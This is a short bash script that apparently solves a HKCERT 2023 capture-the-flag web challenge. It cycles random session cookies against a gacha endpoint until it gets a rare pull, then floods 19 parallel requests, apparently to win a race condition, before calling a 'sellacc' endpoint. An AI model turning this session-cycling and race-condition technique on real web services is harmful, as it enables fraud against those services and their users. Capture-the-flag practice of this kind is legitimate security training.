while true; do
    id=`hexdump -v -n 16 -e '"%x"' /dev/urandom`
    cmd="curl -s --cookie PHPSESSID=$id http://chal-a.hkcert23.pwnable.hk:28137/?gacha1"
    echo $cmd
    $cmd | grep -e "You got UR" -e "You got SSR"
    if [ $? -eq 0 ]; then
        for i in {1..19}; do
            $cmd >/dev/null &
        done
        curl -s --cookie "PHPSESSID=$id" "http://chal-a.hkcert23.pwnable.hk:28137/?sellacc"
        break
    fi
    sleep 1
done
